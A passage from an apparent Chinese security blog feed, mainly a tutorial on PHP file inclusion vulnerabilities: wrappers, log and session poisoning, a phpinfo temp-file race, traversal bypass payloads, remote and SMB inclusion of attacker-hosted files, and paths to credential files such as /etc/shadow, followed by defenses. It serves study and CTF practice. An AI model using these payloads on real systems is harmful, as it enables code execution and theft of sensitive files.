总结</h1><p>这个漏洞单独出现利用点很难(尤其是在黑盒情况),要看这个漏洞利用价值如何,还要看后面的代码能否被利用</p><p>白盒情况下,说不定运气好还可以挖出一些漏洞</p><h1 id="0x06-参考资料"><a href="#0x06-参考资料" class="headerlink" title="0x06  参考资料"></a>0x06  参考资料</h1><p><a href="https://www.freebuf.com/column/150731.html" target="_blank" rel="noopener">代码审计|变量覆盖漏洞</a></p><p><a href="https://www.cnblogs.com/xiaozi/p/7768580.html" target="_blank" rel="noopener">https://www.cnblogs.com/xiaozi/p/7768580.html</a></p><p><a href="https://www.jianshu.com/p/a4d782e91852" target="_blank" rel="noopener">https://www.jianshu.com/p/a4d782e91852</a></p><p><a href="https://blog.csdn.net/qq_36197704/article/details/81623825" target="_blank" rel="noopener">https://blog.csdn.net/qq_36197704/article/details/81623825</a></p><p>&lt;&lt;白帽子讲Web安全&gt;&gt;</p>]]></content>
      
      
      <categories>
          
          <category> TOP10基础漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 变量覆盖 </tag>
            
            <tag> PHP安全问题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一篇文章深入学习文件包含漏洞</title>
      <link href="/posts/20200113/"/>
      <url>/posts/20200113/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00  前言"></a>0x00  前言</h1><p>文件包含,就是用代码去包含(引用)其他文件(这个文件中有需要用到的代码),这样做的目的是节省开发者的时间,提高效率,与此同时也代带来了许多安全问题.以PHP为例,PHP的文件包含相关函数是无<strong>论参数的扩展名是什么,都会将内容当做PHP代码解析(PHP内核决定的)</strong> <a id="more"></a>                                                                                                                                               </p><h1 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01  基础知识"></a>0x01  基础知识</h1><ul><li>PHP伪协议</li><li>PHP相关函数</li><li>日志文件</li><li>PHP临时文件</li></ul><h2 id="PHP相关函数"><a href="#PHP相关函数" class="headerlink" title="PHP相关函数"></a>PHP相关函数</h2><p>php文件包含函数有四种: </p><pre class=" language-php"><code class="language-php"><span class="token keyword">require</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>其中,<code>include()</code>和<code>require()</code>的区别是: include包含过程中如果出现错误,会抛出一个警告,但是程序继续正常运行;require包含过程中如果出现了错误,同样会报错,但是会退出程序的运行</p><p><code>include_once()</code>和<code>require_once()</code>只包含一次,用于解决在同一个文件中,某个脚本执行时同一个文件会被包含超过一次的情况,如果包含的文件被包含过了,就不会再包含了</p><p>在PHP文档中有这样的说明</p><blockquote><p>被包含文件先按参数给出的路径寻找，如果没有给出目录（只有文件名）时则按照include_path 指定的目录寻找。如果在 include_path 下没找到该文件则 include 最后才在调用脚本文件所在的目录和当前工作目录下寻找。<br>当一个文件被包含时，语法解析器在目标文件的开头脱离 PHP 模式并进入 HTML 模式，到文件结尾处恢复。由于此原因，目标文件中需要作为 PHP 代码执行的任何代码都必须被包括在有效的 PHP 起始和结束标记之中。<br>如果“URL include wrappers”在 PHP 中被激活，可以用 URL（通过 HTTP 或者其它支持的封装协议——见支持的协议和封装协议）而不是本地文件来指定要被包含的文件。如果目标服务器将目标文件作为 PHP 代码解释，则可以用适用于 HTTP GET 的 URL 请求字符串来向被包括的文件传递变量。严格的说这和包含一个文件并继承父文件的变量空间并不是一回事；该脚本文件实际上已经在远程服务器上运行了，而本地脚本则包括了其结果。 </p></blockquote><p>在php.ini中有两个重要的参数</p><p>allow_url_include=on/off(<strong>默认为off,不允许包含url里的封装协议包含文件)</strong></p><p>allow_url_fopen=on/off(<strong>默认为on允许url里的封装协议访问文件</strong>)</p><p>要使用include的话必须开启fopen</p><p>双off</p><ol><li>普通本地文件包含正常</li><li>普通远程文件包含不正常</li><li>伪协议包含文件不正常</li></ol><p>allow_url_fopen=on , allow_url_include=off</p><ol><li>普通方式包含本地文件正常</li><li>普通远程文件包含不正常</li><li>伪协议包含文件正常</li></ol><p>双on</p><ol><li>普通本地文件包含正常</li><li>普通远程文件包含正常</li><li>伪协议包含文件正常</li></ol><p><code>readfile()</code>这个函数 对于allow_url_include=on/off没有影响的,allow_url_fopen=on可以让这个函数进行文件包含</p><p>同样的还有 <code>file_get_contents()</code> <code>fopen()</code></p><hr><p>JSP Servlet :  <code>ava.io.File()</code> <code>java.io.FileReader()</code> 等</p><p>ASP:  includefile includevirtual等</p><h2 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h2><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。</p><p>这个协议还可以用来任意文件读取<code>&lt;?php system(&#39;ls&#39;); ?&gt;</code> <code>&lt;?php system(cat /flag)?&gt;</code></p><p>或者写入一句话木马</p><p>需要开启<strong>allow_url_include=on</strong>,php版本小于5.3.0就可以造成任意代码执行</p><p>注：当<em>enctype=”multipart/form-data”</em>时，php://input是无效的。</p><p><img src="https://i.loli.net/2020/01/13/N49YRXA1i7v52xZ.png" alt="1.png"></p><p><img src="https://i.loli.net/2020/01/13/V71sc4UQl2duPhv.png" alt="2.png"></p><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p>经常使用的伪协议，一般用于任意文件读取，有时也可以用于getshell.在双OFF的情况下也可以使用.</p><p>不需要allow_url_fopen和allow_url_include</p><p>php://filter是一种元封装器，用于数据流打开时筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用。类似readfile()、file()、file_get_contents(),在数据流读取之前没有机会使用其他过滤器。</p><p><img src="https://s2.ax1x.com/2019/11/04/Kx2CJx.md.png" alt></p><p><img src="http://tva1.sinaimg.cn/large/007X8olVly1g8l5ruo9tuj311a0ebta9.jpg" alt></p><p>最常用到的就是利用这个协议来读取源码,因为对源码编码后,可以防止文件内容被当做PHP解析</p><p>常见的读源码的payload</p><pre><code>?page=php://filter/read=convert.base64-encode/resource=index.php(读取经过base64编码的index.php)?page=php://filter/convert.base64-encode/resource=index.php(去掉read,可以绕过某些WAF)</code></pre><p><img src="https://i.loli.net/2020/01/13/NFP1fbODrACqaeG.png" alt></p><h3 id="php-output"><a href="#php-output" class="headerlink" title="php://output"></a>php://output</h3><p>对于allow_url_fopen和allow_url_include没有限制</p><blockquote><p>php://output 是一个只写的数据流，允许你以 print 和 echo 一样的方式写入到输出缓冲区。</p></blockquote><h3 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h3><p>file://伪协议在双OFF的时候也可以用，用于本地文件包含</p><p>注：file://协议必须是绝对路径</p><p><img src="http://tva1.sinaimg.cn/large/007X8olVly1g8l5rw25oqj310o0c074z.jpg" alt></p><h3 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h3><p>  使用这个协议必须要 <strong>php版本&gt;5.2.0</strong></p><p>使用这个协议必须 <code>allow_url_include=on</code></p><p>我在XSS中总结过这个协议了,这里直接复制过来好了,只是有一点点的区别而已(<strong>多加两个反斜杠//</strong>)</p><p>data:协议(Data URI Scheme)</p><p>data:协议仅IE浏览器不支持</p><p>data URI scheme 允许我们使用内联（inline-code）的方式在网页中包含数据，目的是将一些小的数据，直接嵌入到网页中，从而不用再从外部文件载入。常用于将图片嵌入网页。</p><p>Data URI Scheme支持的类型有</p><p> data:,&lt;文本数据&gt; </p><p>  data:text/plain,&lt;文本数据&gt; </p><p>  data:text/html,&lt;HTML代码&gt; </p><p>  data:text/html;base64,&lt;base64编码的HTML代码&gt; </p><p>  data:text/css,&lt;CSS代码&gt; </p><p>  data:text/css;base64,&lt;base64编码的CSS代码&gt; </p><p>  data:text/javascript,&lt;Javascript代码&gt; </p><p>  data:text/javascript;base64,&lt;base64编码的Javascript代码&gt; </p><p>  data:image/gif;base64,base64编码的gif图片数据 </p><p>  data:image/png;base64,base64编码的png图片数据 </p><p>  data:image/jpeg;base64,base64编码的jpeg图片数据 </p><p>  data:image/x-icon;base64,base64编码的icon图片数据</p><p><img src="/posts/20200113/E:%5Cimages%5C4%5C4.png" alt="4"></p><h3 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h3><p>利用条件: </p><ul><li>php版本&gt;5.3.0</li><li>php.ini中设置phar.readonly=off(默认为on,本地如果不设置的话就不能生成phar文件)</li></ul><p>简单来说就是php解压缩包的一个函数,解压的压缩包与后缀无关</p><p>PHP对phar的支持如下表</p><p><img src="http://tva1.sinaimg.cn/large/007X8olVly1g71kdrxr7ij310z0iwt9e.jpg" alt></p><p><strong>phar文件</strong></p><blockquote><p>一个php应用程序往往是由多个文件构成的，如果能把他们集中为一个文件来分发和运行是很方便的，这样的列子有很多，比如在window操作系统上面的安装程序、一个jquery库等等，为了做到这点php采用了phar文档文件格式，这个概念源自java的jar，但是在设计时主要针对 PHP 的 Web 环境，与 JAR 归档不同的是Phar 归档可由 PHP 本身处理，因此不需要使用额外的工具来创建或使用，使用php脚本就能创建或提取它。phar是一个合成词，由PHP 和 Archive构成，可以看出它是php归档文件的意思。</p><p>原文链接：<a href="https://blog.csdn.net/u011474028/article/details/54973571" target="_blank" rel="noopener">https://blog.csdn.net/u011474028/article/details/54973571</a></p></blockquote><p>可以把phar文件理解为文件的压缩包,用来做文件的归档</p><p>由四个部分组成: </p><ul><li><p>stub phar: 文件标识，格式为 xxx；</p></li><li><p>manifest: 也就是meta-data，压缩文件的属性等信息，以序列化存储；</p></li><li><p>contents: 压缩文件的内容；</p></li><li><p>signature: 签名，放在文件末尾；</p></li></ul><p>phar文件不仅仅可以可用来进行文件包含漏洞的利用,还可以用来进行phar反序列化利用</p><p>通过phar将一个写有恶意代码的普通文件压缩,然后通过这个协议进行解压执行含有恶意代码的普通文件</p><h3 id="zip-伪协议"><a href="#zip-伪协议" class="headerlink" title="zip://伪协议"></a>zip://伪协议</h3><p>用法：?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] </p><pre><code>zip://xxx.png#shell.php</code></pre><p>条件: </p><p>PHP版本大于5.3.0,在windows下测试要5.3.0&lt;PHP&lt;5.4 才可以 #在浏览器中要编码为%23，否则浏览器默认不会传输特殊字符。</p><h3 id="expect"><a href="#expect" class="headerlink" title="expect://"></a>expect://</h3><p>需要服务器的PHP安装了EXpect扩展,使用expect://来执行命令</p><h2 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h2><ul><li>如果包含错误可能是open_base_dir()被限制</li><li>如果日志文件太大，包含可能会失败，所以选择合适的时间（如凌晨）</li><li>很多种日志文件我们都可以利用（apache,ssh,nginx）</li></ul><p>Linux常见的日志文件如下</p><ul><li>/var/log/apache/access.log </li><li>/var/log/apache/error.log </li><li>/var/log/nginx/access.log </li><li>/var/log/nginx/error.log</li><li>/var/log/vsftpd.log </li><li>/var/log/sshd.log </li><li>/var/log/auth.log </li><li>/var/log/mail </li><li>/var/log/httpd/error_log </li><li>/usr/local/apache/log/error_log</li><li>/usr/local/apache2/log/error_log</li></ul><p>access.log</p><p>文件是记录访问请求的日志文件,因此可以通过将一句话木马作为请求,然后这个一句话就会被写入到日志文件中</p><p>这里直接就拿实验室师傅的图片啦….我的服务器在公网上放问不了…</p><p><img src="http://tva1.sinaimg.cn/large/007X8olVly1g8l5rygfb6j30l602y0sr.jpg" alt></p><p>因为浏览器会对我们的一些字符自动进行url编码,所以要正确的把一句话写入到日志中,要使用<strong>curl</strong>或者<strong>抓包来修改请求</strong> </p><pre><code>curl -v &quot;http://www.targetweb.com/&lt;?php phpinfo();?&gt;&quot;</code></pre><p>然后利用文件包含漏洞来包含access.log就可以执行里面的一句话了</p><p>auth.log  </p><p>sshd.log是记录ssh连接的日志文件,里面有ssh连接的用户信息,所以可以使用一个一句话作为用户名来尝试ssh连接</p><p>ssh <code>&lt;?php phpinfo();?&gt;</code>@116.62.227.151’</p><p>然后就会看到代码被写入到了auth.log,然后利用文件包含就行了</p><p>/proc/self/environ</p><p>是Apache的环境变量文件,可通过<code>User-Agent</code>向其中写入内容,但是条件是php以cgi模式运行(以CGI的方式运行，CGI英文叫做公共网关接口，就是Apache在遇到PHP脚本的时候会将PHP程序提交给CGI应用程序（php-cgi.exe）解释，解释之后的结果返回给Apache，然后再返回给相应的请求用户。)</p><p><strong>CGI?</strong></p><blockquote><p>公共网关接口（Common Gateway Interface，CGI）是Web 服务器运行时外部程序的规范，按CGI 编写的程序可以扩展服务器功能。CGI 应用程序能与<a href="https://baike.baidu.com/item/浏览器/213911" target="_blank" rel="noopener">浏览器</a>进行交互，还可通过数据API与数据库服务器等外部数据源进行<a href="https://baike.baidu.com/item/通信/300982" target="_blank" rel="noopener">通信</a>，从数据库服务器中获取数据。格式化为HTML文档后，发送给浏览器，也可以将从浏览器获得的数据放到数据库中。几乎所有<a href="https://baike.baidu.com/item/服务器/100571" target="_blank" rel="noopener">服务器</a>都支持CGI，可用任何语言编写CGI，包括流行的C、C ++、Java、VB 和Delphi 等。CGI分为标准CGI和间接CGI两种。标准CGI使用<a href="https://baike.baidu.com/item/命令行/196110" target="_blank" rel="noopener">命令行</a>参数或环境变量表示服务器的详细请求，服务器与浏览器通信采用标准输入输出方式。间接CGI又称缓冲CGI，在CGI程序和CGI接口之间插入一个缓冲程序，缓冲程序与CGI接口间用标准输入输出进行通信</p></blockquote><p>修改User-Agent 为 <code>&lt;?php phpinfo();?&gt;</code></p><p>写入代码,再利用文件包含漏洞执行</p><p><strong>读配置文件找日志路径</strong></p><p>/etc/httpd/conf/httpd.conf<br>/etc/init.d/httpd</p><p><strong>Windows日志</strong></p><p>window 2003+iis6.0 日志文件默认放在<br>C:WINDOWSsystem32Logfiles<br>配置文件默认在<br>C:Windowssystem32inetsrvmetabase.xml</p><blockquote><p>iis 7日志文件默认在</p></blockquote><p>C:inetpublogsLogFiles<br> 配置文件默认目录<br>C:WindowsSystem32inetsrvconfigapplicationHost.config</p><blockquote><p>C:apachelogsaccess.log</p></blockquote><p>C:Program FilesApache GroupApachelogsaccess.log<br>C:program fileswampapache2logs<br>C:wamplogs<br>C:xamppapachelogserror.log</p><blockquote><p>C:apachelogserror.log</p></blockquote><p>C:Program FilesApache GroupApachelogserror.log<br>C:wampapache2logs<br>C:xamppapachelogsaccess.log</p><h2 id="PHP临时文件"><a href="#PHP临时文件" class="headerlink" title="PHP临时文件"></a>PHP临时文件</h2><p>php在上传文件时都会产生一个临时文件，将数据先写入临时文件，等完成文件上传后再删除临时文件（整个过程如下图所示</p><p><img src="http://tva1.sinaimg.cn/large/007X8olVly1g8l5rtmf4yj30oo0emgqi.jpg" alt></p><p>因为临时文件名是随机的，如果目标网站上存在phpinfo，则可以通过phpinfo来获取临时文件名，进而进行包含。</p><p><a href="https://github.com/vulhub/vulhub/tree/master/php/inclusion" target="_blank" rel="noopener">利用方法</a></p><p>在给PHP发送POST数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP都会将这个文件保存成一个临时文件（通常是<code>/tmp/php[6个随机字符]</code>），文件名可以在<code>$_FILES</code>变量中找到。这个临时文件，在请求结束后就会被删除。</p><p>同时，因为phpinfo页面会将当前请求上下文中所有变量都打印出来，所以我们如果向phpinfo页面发送包含文件区块的数据包，则即可在返回包里找到<code>$_FILES</code>变量的内容，自然也包含临时文件名。</p><p>在文件包含漏洞找不到可利用的文件时，即可利用这个方法，找到临时文件名，然后包含之。</p><p>但文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行getshell。在第一个请求结束时，临时文件就被删除了，第二个请求自然也就无法进行包含。</p><p>这个时候就需要用到条件竞争，具体流程如下：</p><ol><li>发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据</li><li>因为phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大</li><li>php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接</li><li>所以，我们直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包</li><li>此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除</li><li>利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终getshell</li></ol><p>有些东西还是有点难理解的</p><h1 id="0x02-什么是文件包含漏洞"><a href="#0x02-什么是文件包含漏洞" class="headerlink" title="0x02  什么是文件包含漏洞"></a>0x02  什么是文件包含漏洞</h1><p>利用条件: </p><ul><li>include函数通过动态变量的方式引入需要包含的文件</li><li>用户能控制该动态变量</li></ul><p>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。</p><p>这个恶意代码可以是一句话木马,导致getshell 也可以利用文件包含漏洞来任意文件读取,读取服务器上的一些敏感数据</p><p>举个最简单的代码实例</p><pre class=" language-PHP"><code class="language-PHP"><?php  $test = $_GET['a'];  include($test);?></code></pre><p>这里对获取到的参数没有进行任何过滤直接传入<code>include()</code>函数,攻击者可以修改参数的值来进行一些攻击</p><p>文件包含分两种,一个是本地文件包含还有就是远程文件包含</p><h2 id="本地文件包含-LFI"><a href="#本地文件包含-LFI" class="headerlink" title="本地文件包含(LFI)"></a>本地文件包含(LFI)</h2><p>本地文件包含漏洞,就是包含服务器本地的文件,实战中遇到的文件包含漏洞<strong>多数为本地文件包含漏洞</strong></p><h3 id="无限制本地文件包含"><a href="#无限制本地文件包含" class="headerlink" title="无限制本地文件包含"></a>无限制本地文件包含</h3><p>无限制的话,就可以直接用上面的一些基础知识和常见payload直接利用文件包含漏洞得到phpinfo啊,或者网站源码等</p><p><strong>常见的敏感信息路径：</strong></p><p>Windows系统</p><blockquote><p>c:\boot.ini // 查看系统版本</p><p>c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件</p><p>c:\windows\repair\sam // 存储Windows系统初次安装的密码</p><p>c:\ProgramFiles\mysql\my.ini // MySQL配置</p><p>c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码</p><p>c:\windows\php.ini // php 配置信息</p></blockquote><p>Linux/Unix系统</p><blockquote><p>/etc/passwd // 账户信息</p><p>/etc/shadow // 账户密码文件</p><p>/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件</p><p>/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置</p><p>/usr/local/app/php5/lib/php.ini // PHP相关配置</p><p>/etc/httpd/conf/httpd.conf // Apache配置文件</p><p>/etc/my.conf // mysql 配置文件</p></blockquote><h3 id="session文件包含漏洞"><a href="#session文件包含漏洞" class="headerlink" title="session文件包含漏洞"></a>session文件包含漏洞</h3><p>session会话是存储在多个页面中使用的信息的方式,session不是保存在用户计算机中的</p><p>会话变量通过使用PHP全局变量$_SESSION设置,当php程序结束时,程序读取session的值,将其反序列化,发送到服务器中进行保存,然后保存管理器将会话保存在session.save_path中</p><p>利用条件: </p><ul><li>session存储位置可以获取</li></ul><p>常见的存放位置</p><blockquote><p>/var/lib/php/sess_PHPSESSID<br>/var/lib/php/sess_PHPSESSID<br>/tmp/sess_PHPSESSID<br>/tmp/sessions/sess_PHPSESSID<br>/tmp/tmp</p></blockquote><ul><li>session中的内容可以被控制,传入恶意代码</li></ul><p>1)可以通过phpinfo的信息来获取session的存储位置</p><p>搜索<code>session.save_path</code>来获取</p><p>2)猜测默认session存放位置进行尝试</p><p>linux下默认存储在/var/lib/php/session目录</p><p>代码示例:  </p><pre class=" language-PHP"><code class="language-PHP"><?php    session_start();$ctfs=$_GET['ctfs'];$_SESSION["username"]=$ctfs;?></code></pre><p>漏洞分析: </p><p>脚本获取到GET行变量的值存入session中</p><p>当访问 <a href="http://www.x.com/session.php?ctfs=wtf" target="_blank" rel="noopener">http://www.x.com/session.php?ctfs=wtf</a> </p><p>会在/var/lib/php/session目录下存储session 的值</p><p>session的文件名为  sess_+sessionid ,  sessionid可以通过开发者模式获取</p><p>漏洞利用: </p><p>通过ctfs传入的值会存储到session文件中,在存在本地文件包含漏洞的情况下,可以在ctfs写入恶意代码到session文件中,然后通过文件包含漏洞执行恶意代码来getshell</p><p>比如<code>?ctfs=&lt;?php phpinfo();?&gt;</code>得到session存储的位置</p><p><img src="https://i.loli.net/2020/01/13/bi9kNmCaT8X4ZyW.png" alt></p><p>构造payload</p><p><img src="https://i.loli.net/2020/01/13/ZUXkgHf2zqCS7y4.png" alt></p><p>其中../是目录切换符,后面会讲</p><h2 id="远程文件包含-RFI"><a href="#远程文件包含-RFI" class="headerlink" title="远程文件包含(RFI)"></a>远程文件包含(RFI)</h2><p>远程文件包含,就是包含远程服务器上的文件.</p><p>条件: </p><ul><li>allow_url_include=on(PHP版本5.2后,默认off)</li><li>allow_url_fopen=on(要上面那个打开有作用,这个必须也打开)</li></ul><p>最简单的代码示例: </p><pre class=" language-PHP"><code class="language-PHP"><?php    $filename  = $_GET['filename'];    include($filename);?></code></pre><p>payload: </p><pre><code>http://www.a.com/RFI.php?filename=http://www.b.com/RFI/php.txt</code></pre><p>在php.txt中写入<code>&lt;?php phpinfo();?&gt;</code></p><p>成功包含就能访问到有phpinfo界面</p><p>当然还能做的更多,主要依据防御的如何.</p><h1 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03  漏洞利用"></a>0x03  漏洞利用</h1><p>利用点: </p><blockquote><p>index.php?file= (action=) (page=)(path=)</p></blockquote><p>文件包含漏洞的利用,最常见的就是<strong>读</strong>源码(做CTF题时),或者通过文件包含漏洞和其他漏洞(文件上传)一起getshell(<strong>写</strong>),其实上面也总结的差不多了….</p><p>后面会从书中看看有没有更好的利用方式</p><h1 id="0x04-绕过姿势"><a href="#0x04-绕过姿势" class="headerlink" title="0x04  绕过姿势"></a>0x04  绕过姿势</h1><p><strong>%00截断</strong></p><p>这是因为<strong>PHP内核是C语言实现的,0字节\x00将作为字符串结束符</strong></p><p>条件: </p><ol><li>magic_quotes_gpc=off</li><li>PHP版本&lt;5.3.4</li></ol><p>即在构造的payload最后加上%00,这种情况,一般是因为后端代码指定了包含的文件的扩展名,因此可以截断后面的内容来包含任意文件</p><p><strong>%00截断目录遍历</strong></p><p>条件: </p><ol><li>magic_quotes_gpc=off</li><li>unix文件系统(FreeBSD, OpenBSD,Solaris)</li></ol><p>/var/www/%00</p><p><strong>路径长度截断</strong></p><p>条件: </p><p>php版本小于5.2.8</p><p>使用./或.来进行截断</p><p>条件: </p><p>Windows .的长度大于256;linux .的长度大于4096</p><blockquote><p>Windows下目录最大长度为256字节，超出的部分会被丢弃；</p><p>Linux下目录最大长度为4096字节，超出的部分会被丢弃。</p></blockquote><p>/etc/passwd/././././././.[…]/./././././.</p><p>/boot.ini/………[…]…………</p><p><strong>URL二次编码</strong></p><p>如果后端对用户的输入进行URL解码后再包含的话（类似下面的代码），就有可能利用url二次编码来绕过前面的过滤</p><pre class=" language-PHP"><code class="language-PHP"><?phpinclude(urldecode($_GET['file']));?></code></pre><p>我们先看一下利用的payload：</p><pre><code>%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd</code></pre><p>payload先被浏览器进行一次url解码，%25对应%，此时payload变为：</p><pre><code>%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd</code></pre><p>之后又被php进行一次url解码，%2e对应.，%2f对应/，因此最后包含的就是../../../etc/passwd</p><p>但是我觉得这个点,不是很好利用啊</p><p><strong>使用通配符</strong></p><p>&lt;&lt;</p><p>没有base_dir的限制,可以读到本地文件</p><blockquote><p>这个问题是由Windows APi FindFirstFile函数引起的，这是FindFirstFile的一个特性，查看php原代码发现在win32readdir.c，正是调用了FindFirstFile来操作文件的。因此受影响的并不止include函数。</p></blockquote><p><strong>双写绕过</strong></p><p>如果后端代码使用了<code>str_replace()</code>将../替换为空或者其他时,可以尝试双写绕过</p><p>…/./…/./…/./etc/passwd,实际情况是怎么过滤的就怎么绕过</p><hr><p><strong>?号绕过</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">".html"</span><span class="token punctuation">)</span><span class="token delimiter">?></span></code></pre><p>?html就绕过啦</p><p><strong>#号绕过</strong></p><p>因为URL编码问题,需要把#编码为%23</p><p><strong>空格绕过</strong></p><p>%20</p><hr><p><strong>bypass allow_url_include=off</strong></p><p>包含smb共享服务中的文件,但只能对Windows的服务器有用,并且国内很多运营商默认关闭445端口</p><p>利用方式: </p><p>在smb共享文件夹放一个含有恶意代码的.txt文件,后缀名其实都无所谓,因为其中的内容都会被当做php代码来解析</p><p>然后包含这个smb服务的文件</p><pre><code>?file=\\ip\user\evil.txt</code></pre><h1 id="0x05-漏洞防御"><a href="#0x05-漏洞防御" class="headerlink" title="0x05  漏洞防御"></a>0x05  漏洞防御</h1><p>如果业务不需要一些文件包含的话</p><p>可以选择性的设置</p><p>allow_url_fopen=off allow_url-include=off</p><p>magic_quotes_gpc=on</p><p>过滤掉../../等 url中拼接到的http:// https://(RFI)</p><p>禁用0字节,因为用户完全不需要使用0字节</p><pre class=" language-php"><code class="language-php"><span class="token variable">$value</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"\0"</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>为PHP配置<code>open_basedir</code>可以时目录遍历(../../../)这种攻击方式无效</p><p>open_basedir的作用是限制在某个特定目录下PHP能打开的文件,与safe_mode是否开启无关</p><p>避免包含动态的变量,尤其是用户可以控制的变量,使用枚举的方法</p><pre class=" language-PHP"><code class="language-PHP"><?php    $file = $_GET['file'];//Whitelisting possible valuesswitch ($file) {    case 'main':    case 'foo':    case 'bar':        include '/home/www/include'.$file.'.php';        break;    default:        include '/home/www/include/main.php';}</code></pre><h1 id="0x06-漏洞挖掘"><a href="#0x06-漏洞挖掘" class="headerlink" title="0x06  漏洞挖掘"></a>0x06  漏洞挖掘</h1><p>这个漏洞的话,通过做CTF题也知道.一般就是<strong>观察url</strong>是否存在?file=  或者?page= 这种类型的 ,就可能存在文件包含漏洞,然后利用上面的payload去试,如果有错误回显就根据错误回显来判断</p><p>有时候也可以扫目录,或者robots.txt 看有没能够得到现成的phpinfo界面,然后看allow_url_fopen和allow_url_include的状态是什么样的,来对应的来进行利用,但是也要找到可以利用的参数才行</p><h1 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07  总结"></a>0x07  总结</h1><p>文件包含这个漏洞,单独利用现在已经很难了,一般都需要配合其他漏洞一起来利用,或者读到一些信息</p><h1 id="0x08-参考资料"><a href="#0x08-参考资料" class="headerlink" title="0x08  参考资料"></a>0x08  参考资料</h1><p><a href="https://www.freebuf.com/articles/web/182280.html" target="_blank" rel="noopener">Web安全实战系列：文件包含漏洞</a></p><p><a href="https://loong716.top/2019/11/03/File_Inclusion.html#%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0" target="_blank" rel="noopener">longlong师傅的File Inclusion Summary</a>  </p><p><strong><em>从这篇文章我学习了,学某个漏洞一定要求看相关的官方文档</em></strong></p><p><a href="https://www.nnullull.cn/index.php/archives/3/" target="_blank" rel="noopener">zjh师傅的TOP10-漏洞之文件包含</a></p><p><a href="https://www.cnblogs.com/dubhe-/p/9997842.html" target="_blank" rel="noopener">浅析PHP伪协议在CTF中的应用</a></p><p><a href="https://www.cnblogs.com/shellr00t/p/7638034.html" target="_blank" rel="noopener">PHP伪协议探究</a></p><p><a href="https://www.cnblogs.com/Renyi-Fan/p/9811197.html#_label0_2" target="_blank" rel="noopener">https://www.cnblogs.com/Renyi-Fan/p/9811197.html#_label0_2</a></p><p><a href="https://www.jianshu.com/p/3dc97deec491" target="_blank" rel="noopener">文件包含漏洞的几种利用</a></p><p><a href="https://3wapp.github.io/WebSecurity/php-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.html" target="_blank" rel="noopener">https://3wapp.github.io/WebSecurity/php-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB.html</a></p><p><a href="http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html" target="_blank" rel="noopener">http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html</a></p><p>多查资料,多总结</p>]]></content>
      
      
      <categories>
          
          <category> TOP10基础漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一篇文章深入学习XXE漏洞</title>
      <link href="/posts/20200110/"/>
      <url>/posts/20200110/</url>
      
